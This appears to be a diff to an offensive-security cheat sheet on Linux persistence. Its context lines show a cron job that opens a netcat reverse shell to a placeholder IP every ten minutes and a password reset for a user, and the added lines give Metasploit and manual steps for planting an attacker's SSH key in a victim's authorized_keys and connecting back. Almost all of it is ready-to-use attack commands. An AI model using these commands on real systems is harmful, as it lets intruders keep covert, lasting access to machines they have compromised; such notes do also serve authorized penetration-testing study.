@@ -13,3 +13,18 @@ echo "linuxpassword" | passwd --stdin john
 # Cron Tab Persistence (every 10 minutes)
 crontab -e
 0-59/10 * * * * nc <IP> 777 -e /bin/bash
+
+
+# Add SSH Key (metasploit)
+> use post/linux/manage/sshkey_persistence
+
+# Add SSH Key (manual)
+ssh-keygen -f <FILENAME>
+chmod 600 <FILENAME>
+cat <FILENAME>.pub -> copy
+
+> On Victim:
+echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys
+
+> To Connect:
+ssh -i <FILENAME> <USER>@<IP>
